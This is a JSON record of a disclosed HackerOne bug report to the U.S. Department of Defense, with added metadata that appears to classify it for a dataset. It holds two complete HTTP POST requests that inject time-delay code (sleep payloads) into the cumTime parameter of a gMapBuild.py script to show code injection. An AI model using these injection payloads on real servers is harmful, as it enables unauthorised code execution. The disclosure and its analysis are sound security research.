{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "e3xpl0it ",
  "title": "\u0421ode injection host  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
  "content": "\nGood day, security team. Host \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 vulnerable to code injection.\nPOC\nThe server makes a time delay.\nPOST /cgi-bin/gMapBuild.py HTTP/1.1\nHost: \u2588\u2588\u2588\nAccept: /\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 65\nConnection: close\nmapArea=colP&cumTime=${{\"sleep\"%2c\"13\"})}${{\"timeout\"%2c\"13\"})}\nor\nPOST /cgi-bin/gMapBuild.py HTTP/1.1\nHost: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAccept: /\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 79\nConnection: close\nmapArea=colP&cumTime=${sleep(hexdec(dechex(13)))}${sleep(hexdec(dechex(13)))}\nImpact\nPotential execution of arbitrary code.\nhttps://owasp.org/www-community/attacks/Code_Injection\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1599168420,
  "report_url": "https://hackerone.com/reports/954398",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a POST request to /cgi-bin/gMapBuild.py with the payload containing a sleep command in the mapArea or cumTime parameter."
    ],
    [
      2,
      "Observe the server's response time to confirm the code injection vulnerability."
    ]
  ],
  "vuln_description": "The vulnerability is a code injection flaw in the host's gMapBuild.py script, where an attacker can inject and execute arbitrary commands through the mapArea or cumTime parameters, leading to potential remote code execution.",
  "reason": "The attack involves a straightforward injection of sleep commands to test for vulnerability, without requiring complex application state manipulation or understanding of novel logic. The interaction is direct and the components involved are minimal.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The code injection vulnerability involves server-side execution of arbitrary commands, which is not directly related to authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, not on injecting malicious code or testing for command execution vulnerabilities.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves a code injection via the `cumTime` parameter, which triggers a time delay when a payload like `${sleep(13)}` is injected. The methodology would log the HTTP request to `/cgi-bin/gMapBuild.py` during regular navigation, identify `cumTime` as an injectable parameter, and test it with simple payloads (e.g., sleep commands). Since the server's delay is observable directly in the response time (same channel), the execution is detectable without complex filter bypasses or external navigation. The payloads used (e.g., `sleep(hexdec(dechex(13)))`) are simple permutations of encoding/context adjustments, aligning with the 'simple payload' criteria.",
    "is_simple_injection": true
  }
}